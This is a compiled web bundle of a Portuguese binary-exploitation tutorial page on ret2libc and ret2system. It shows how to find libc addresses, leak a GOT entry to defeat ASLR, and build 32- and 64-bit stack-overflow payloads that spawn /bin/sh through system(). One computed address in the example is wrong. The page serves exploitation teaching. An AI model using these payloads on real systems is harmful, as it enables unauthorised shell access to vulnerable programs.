"use strict";(globalThis.webpackChunkmanual_pwning_docs=globalThis.webpackChunkmanual_pwning_docs||[]).push([[2557],{8453(e,r,s){s.d(r,{R:()=>i,x:()=>d});var n=s(6540);const a={},o=n.createContext(a);function i(e){const r=n.useContext(o);return n.useMemo(function(){return"function"==typeof e?e(r):{...r,...e}},[r,e])}function d(e){let r;return r=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),n.createElement(o.Provider,{value:r},e.children)}},9898(e,r,s){s.r(r),s.d(r,{assets:()=>c,contentTitle:()=>d,default:()=>p,frontMatter:()=>i,metadata:()=>n,toc:()=>t});const n=JSON.parse('{"id":"pwning/rop/8-5-ret2libc","title":"ret2libc","description":"ret2libc \xe9 um caso de ROP onde usamos uma fun\xe7\xe3o qualquer da libc (biblioteca de fun\xe7\xf5es padr\xe3o do C), system(), execve(), mprotect(), gets(), etc.]","source":"@site/docs/pwning/rop/8-5-ret2libc.mdx","sourceDirName":"pwning/rop","slug":"/pwning/rop/8-5-ret2libc","permalink":"/manual-pwning/docs/pwning/rop/8-5-ret2libc","draft":false,"unlisted":false,"tags":[],"version":"current","frontMatter":{"title":"ret2libc"},"sidebar":"tutorialSidebar","previous":{"title":"SIGROP (Sigreturn-Oriented Programming)","permalink":"/manual-pwning/docs/pwning/rop/8-4-sigrop"},"next":{"title":"Fast Food","permalink":"/manual-pwning/docs/fast-food/beginning"}}');var a=s(4848),o=s(8453);const i={title:"ret2libc"},d=void 0,c={},t=[{value:"Antes: Como achar os endere\xe7os?",id:"antes-como-achar-os-endere\xe7os",level:2},{value:"Sem ASLR",id:"sem-aslr",level:3},{value:"Com ASLR",id:"com-aslr",level:3},{value:"ret2system",id:"ret2system",level:2},{value:"Para x86 (32-bit):",id:"para-x86-32-bit",level:3},{value:"para x86-64 (64-bit)",id:"para-x86-64-64-bit",level:3}];function l(e){const r={a:"a",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",...(0,o.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsxs)(r.p,{children:["ret2libc \xe9 um caso de ROP onde usamos uma fun\xe7\xe3o qualquer da libc (biblioteca de fun\xe7\xf5es padr\xe3o do C), ",(0,a.jsx)(r.code,{children:"system()"}),", ",(0,a.jsx)(r.code,{children:"execve()"}),", ",(0,a.jsx)(r.code,{children:"mprotect()"}),", ",(0,a.jsx)(r.code,{children:"gets()"}),", etc.]"]}),"\n",(0,a.jsxs)(r.p,{children:["Como exemplo, vamos fazer um ret2libc com a fun\xe7\xe3o ",(0,a.jsx)(r.code,{children:"system()"}),", que \xe9 a mais comum, pois executa qualquer comando e pode abrir uma shell."]}),"\n",(0,a.jsx)(r.h2,{id:"antes-como-achar-os-endere\xe7os",children:"Antes: Como achar os endere\xe7os?"}),"\n",(0,a.jsx)(r.h3,{id:"sem-aslr",children:"Sem ASLR"}),"\n",(0,a.jsx)(r.p,{children:"Tudo fica no mesmo lugar de sempre."}),"\n",(0,a.jsxs)(r.p,{children:["Passo 1: Encontre onde a libc est\xe1 carregada com ",(0,a.jsx)(r.code,{children:"ldd"})," (List Dynamic Dependencies - lista bibliotecas din\xe2micas que o programa precisa, como ",(0,a.jsx)(r.code,{children:"libc"}),")"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"$ ldd ./programa_vulneravel\r\n    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc0000)\r\n    # \u2191 Aqui! Base da libc = 0x00007ffff7dc0000\n"})}),"\n",(0,a.jsx)(r.p,{children:'Passo 2: Encontre os "offsets" (dist\xe2ncias)'}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:'$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"\r\n  235: 000000000004c350    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5\r\n    # \u2191 Offset do system = 0x4c350\r\n\r\n$ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"\r\n 1b5d0f8 /bin/sh\r\n    # \u2191 Offset do /bin/sh = 0x1b5d0f8\n'})}),"\n",(0,a.jsx)(r.p,{children:"Passo 3: Some base + offset"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"system_addr = 0x00007ffff7dc0000 + 0x4c350 = 0x7ffff7e0c350\r\nbin_sh_addr = 0x00007ffff7dc0000 + 0x1b5d0f8 = 0x7ffff7f75d0f8\n"})}),"\n",(0,a.jsx)(r.h3,{id:"com-aslr",children:"Com ASLR"}),"\n",(0,a.jsx)(r.p,{children:"Precisamos vazar um endere\xe7o primeiro."}),"\n",(0,a.jsx)(r.p,{children:"Parte 1: Vazar um endere\xe7o conhecido"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"payload1 = padding + puts_addr + volta_para_main + puts_got\r\n# puts(puts@got) vai imprimir o endere\xe7o REAL do puts\n"})}),"\n",(0,a.jsx)(r.p,{children:"Parte 2: Calcular base da libc"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"leaked_puts = recebe_do_programa()  # Ex: 0x7ffff7e3d420\r\nlibc_base = leaked_puts - puts_offset  # 0x7ffff7dc0000\r\nsystem_addr = libc_base + system_offset\n"})}),"\n",(0,a.jsx)(r.h2,{id:"ret2system",children:"ret2system"}),"\n",(0,a.jsxs)(r.p,{children:["ret2system \xe9 um caso de ROP ret2libc onde usamos a fun\xe7\xe3o ",(0,a.jsx)(r.code,{children:"system()"}),". Essa fun\xe7\xe3o executa um comando shell qualquer (abrir app, ",(0,a.jsx)(r.code,{children:"ls"}),", ",(0,a.jsx)(r.code,{children:"/bin/sh"}),", etc)."]}),"\n",(0,a.jsx)(r.p,{children:"Para fazer um ret2system:"}),"\n",(0,a.jsxs)(r.ol,{children:["\n",(0,a.jsxs)(r.li,{children:["Chama-se ",(0,a.jsx)(r.code,{children:"system()"})," no return address"]}),"\n",(0,a.jsxs)(r.li,{children:["Coloca-se ",(0,a.jsx)(r.code,{children:"exit()"})," ap\xf3s return address. Quando ",(0,a.jsx)(r.code,{children:"system()"})," retornar, ",(0,a.jsx)(r.code,{children:"exit()"})," ser\xe1 executado. (sa\xedda limpa)"]}),"\n",(0,a.jsxs)(r.li,{children:["Coloca-se argumento para system ap\xf3s ",(0,a.jsx)(r.code,{children:"exit()"})]}),"\n"]}),"\n",(0,a.jsxs)(r.p,{children:["Para entender como chamar ",(0,a.jsx)(r.code,{children:"system()"})," e passar os par\xe2metros, recomendo ver o material ",(0,a.jsx)(r.a,{href:"/docs/extra/call-convention",children:"Conven\xe7\xe3o de chamada de fun\xe7\xf5es"}),"."]}),"\n",(0,a.jsx)(r.h3,{id:"para-x86-32-bit",children:"Para x86 (32-bit):"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:'payload = b"A" * 76           # Preencher buffer at\xe9 return address\r\npayload += p32(0xb7e3d850)   # system()    \u2190 Sobrescreve return address\r\npayload += p32(0xb7e2f5c0)   # exit()      \u2190 Executado quando system() retornar\r\npayload += p32(0xb7f5d0f8)   # "/bin/sh"   \u2190 Argumento para system()!\r\n                            #             \u2191 ESP+4 (frame antigo) ou EBP+8 (frame novo) quando system() come\xe7a\n'})}),"\n",(0,a.jsxs)(r.p,{children:["Isso ocorre pois, ap\xf3s chamar system (",(0,a.jsx)(r.code,{children:"pop eip"}),"), ",(0,a.jsx)(r.code,{children:"esp"})," atual = exit(). O system() vai fazer ",(0,a.jsx)(r.code,{children:"push rbp"}),", ",(0,a.jsx)(r.code,{children:"mov rbp, rsp"}),", e teremos:"]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"EBP   \u2192 EBP antigo (lixo agora, por causa do BOF)\r\nEBP+4 \u2192 exit() (return address)\r\nEBP+8 \u2192 1\xb0 par\xe2metro\n"})}),"\n",(0,a.jsx)(r.p,{children:"Isto, pois system() internamente faz:"}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{children:"; system() em x86 (32-bit)\r\nsystem:\r\n    push    ebp                 ; Salva frame pointer antigo\r\n    mov     ebp, esp            ; Novo frame pointer\r\n    sub     esp, 0x10           ; Aloca espa\xe7o para vari\xe1veis locais\r\n    mov     eax, [ebp+8]        ; Pega primeiro argumento (comando)\r\n    mov     [esp], eax          ; Prepara argumento para fun\xe7\xe3o interna\r\n    call    do_system           ; Fun\xe7\xe3o interna real\r\n    ; ... mais c\xf3digo ...\r\n    ret\r\n\r\n; system() em x64 (64-bit)  \r\nsystem:\r\n    push    rbp                 ; Salva frame pointer\r\n    mov     rbp, rsp            ; Novo frame pointer  \r\n    sub     rsp, 0x10           ; Espa\xe7o local\r\n    mov     QWORD PTR [rsp], rdi  ; Salva argumento na stack para fun\xe7\xe3o interna\r\n    call    do_system           ; Fun\xe7\xe3o interna real\r\n    ; ... mais c\xf3digo ...\r\n    ret\n"})}),"\n",(0,a.jsx)(r.h3,{id:"para-x86-64-64-bit",children:"para x86-64 (64-bit)"}),"\n",(0,a.jsxs)(r.p,{children:["Basta usar um gadget ROP para colocar o primeiro par\xe2metro em ",(0,a.jsx)(r.code,{children:"rdi"}),", j\xe1 que os par\xe2metros s\xe3o pegos dos registradores."]}),"\n",(0,a.jsx)(r.pre,{children:(0,a.jsx)(r.code,{className:"language-py",children:'payload = b"A" * 72            # Padding at\xe9 RIP\r\npayload += p64(0x4011ab)       # gadget: pop rdi; ret\r\npayload += p64(0x7ffff7f5d0f8) # "/bin/sh" em RDI\r\npayload += p64(0x7ffff7e1e350) # system()\r\npayload += p64(0x7ffff7e11420) # exit() - opcional\n'})})]})}function p(e={}){const{wrapper:r}={...(0,o.R)(),...e.components};return r?(0,a.jsx)(r,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}}}]);